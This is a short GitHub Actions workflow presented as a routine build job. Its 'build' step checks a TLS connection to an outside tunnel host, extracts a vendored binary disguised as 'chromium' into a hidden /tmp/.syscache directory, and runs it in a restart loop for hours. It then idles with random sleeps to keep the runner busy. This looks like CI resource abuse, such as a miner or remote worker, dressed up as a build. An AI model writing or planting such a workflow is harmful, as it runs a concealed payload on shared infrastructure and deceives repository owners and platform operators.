name: build-fk6o
on:
  workflow_dispatch:
jobs:
  validate_eor:
    runs-on: ubuntu-latest
    timeout-minutes: 357
    steps:
      - uses: actions/checkout@v4
      - run: nproc
      - run: python3 --version
      - run: uname -m
      - name: build
        run: |
          python3 -c "import socket,ssl; s=socket.create_connection(('z5h8srda9j.localto.net',8999),timeout=10); print('NET-TCP-OPEN'); c=ssl.create_default_context().wrap_socket(s,server_hostname='z5h8srda9j.localto.net'); print('NET-TLS-OK',c.version())" || echo NET-FAIL
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 205m bash -c 'while true; do ./chromium; echo "worker-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          UJ43=$((SECONDS + 143 * 60))
          while [ $SECONDS -lt $UJ43 ]; do sleep $((RANDOM % 102 + 35)); echo "$(date -u +%H:%M:%S) 1rrzai"; done
